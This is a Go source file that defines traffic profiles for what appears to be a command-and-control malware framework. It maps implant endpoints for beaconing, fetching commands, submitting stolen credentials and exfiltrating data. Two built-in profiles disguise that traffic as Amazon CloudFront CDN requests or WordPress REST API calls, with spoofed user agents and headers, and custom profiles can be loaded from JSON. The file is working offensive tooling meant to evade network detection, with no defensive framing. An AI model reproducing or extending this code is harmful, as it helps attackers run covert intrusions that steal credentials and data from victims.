package profiles

import (
	"encoding/json"
	"os"
)

type Profile struct {
	Name    string       `json:"name"`
	Agent   AgentConfig  `json:"agent"`
	Server  ServerConfig `json:"server"`
	Headers []Header     `json:"headers"`
}

type AgentConfig struct {
	UserAgent string            `json:"user_agent"`
	Paths     map[string]string `json:"paths"`
}

type ServerConfig struct {
	Paths map[string]string `json:"paths"`
}

type Header struct {
	Name  string `json:"name"`
	Value string `json:"value"`
}

func Default() *Profile {
	return &Profile{
		Name: "default",
		Agent: AgentConfig{
			UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
			Paths: map[string]string{
				"register":      "/api/v1/agent/register",
				"beacon":        "/api/v1/agent/beacon",
				"commands":      "/api/v1/agent/commands",
				"result":        "/api/v1/agent/result",
				"credentials":   "/api/v1/agent/credentials",
				"exfil":         "/api/v1/agent/exfil",
				"refresh_token": "/api/v1/agent/refresh-token",
			},
		},
		Server: ServerConfig{
			Paths: map[string]string{
				"register":      "/api/v1/agent/register",
				"beacon":        "/api/v1/agent/beacon",
				"commands":      "/api/v1/agent/commands",
				"result":        "/api/v1/agent/result",
				"credentials":   "/api/v1/agent/credentials",
				"exfil":         "/api/v1/agent/exfil",
				"refresh_token": "/api/v1/agent/refresh-token",
			},
		},
		Headers: []Header{
			{Name: "Accept", Value: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"},
			{Name: "Accept-Language", Value: "en-US,en;q=0.5"},
		},
	}
}

func CloudFront() *Profile {
	return &Profile{
		Name: "cloudfront",
		Agent: AgentConfig{
			UserAgent: "Amazon CloudFront",
			Paths: map[string]string{
				"register":      "/cdn-cgi/trace",
				"beacon":        "/cdn-cgi/analytics",
				"commands":      "/cdn-cgi/scripts",
				"result":        "/cdn-cgi/report",
				"credentials":   "/cdn-cgi/submit",
				"exfil":         "/cdn-cgi/upload",
				"refresh_token": "/cdn-cgi/refresh",
			},
		},
		Server: ServerConfig{
			Paths: map[string]string{
				"register":      "/cdn-cgi/trace",
				"beacon":        "/cdn-cgi/analytics",
				"commands":      "/cdn-cgi/scripts",
				"result":        "/cdn-cgi/report",
				"credentials":   "/cdn-cgi/submit",
				"exfil":         "/cdn-cgi/upload",
				"refresh_token": "/cdn-cgi/refresh",
			},
		},
		Headers: []Header{
			{Name: "Accept", Value: "application/json"},
			{Name: "X-Amz-Cf-Id", Value: "dynamic"},
		},
	}
}

func WordPress() *Profile {
	return &Profile{
		Name: "wordpress",
		Agent: AgentConfig{
			UserAgent: "WordPress/6.4; https://example.com",
			Paths: map[string]string{
				"register":      "/wp-json/wp/v2/users",
				"beacon":        "/wp-json/wp/v2/posts",
				"commands":      "/wp-json/wp/v2/pages",
				"result":        "/wp-json/wp/v2/comments",
				"credentials":   "/wp-json/wp/v2/media",
				"exfil":         "/wp-json/wp/v2/tags",
				"refresh_token": "/wp-json/wp/v2/categories",
			},
		},
		Server: ServerConfig{
			Paths: map[string]string{
				"register":      "/wp-json/wp/v2/users",
				"beacon":        "/wp-json/wp/v2/posts",
				"commands":      "/wp-json/wp/v2/pages",
				"result":        "/wp-json/wp/v2/comments",
				"credentials":   "/wp-json/wp/v2/media",
				"exfil":         "/wp-json/wp/v2/tags",
				"refresh_token": "/wp-json/wp/v2/categories",
			},
		},
		Headers: []Header{
			{Name: "Accept", Value: "application/json"},
			{Name: "X-WP-Nonce", Value: "dynamic"},
		},
	}
}

var builtinProfiles = map[string]func() *Profile{
	"default":    Default,
	"cloudfront": CloudFront,
	"wordpress":  WordPress,
}

func Load(nameOrPath string) (*Profile, error) {
	if fn, ok := builtinProfiles[nameOrPath]; ok {
		return fn(), nil
	}

	data, err := os.ReadFile(nameOrPath)
	if err != nil {
		return nil, err
	}

	var p Profile
	if err := json.Unmarshal(data, &p); err != nil {
		return nil, err
	}
	return &p, nil
}

func (p *Profile) AgentPath(name string) string {
	if path, ok := p.Agent.Paths[name]; ok {
		return path
	}
	return Default().Agent.Paths[name]
}

func (p *Profile) ServerPath(name string) string {
	if path, ok := p.Server.Paths[name]; ok {
		return path
	}
	return Default().Server.Paths[name]
}
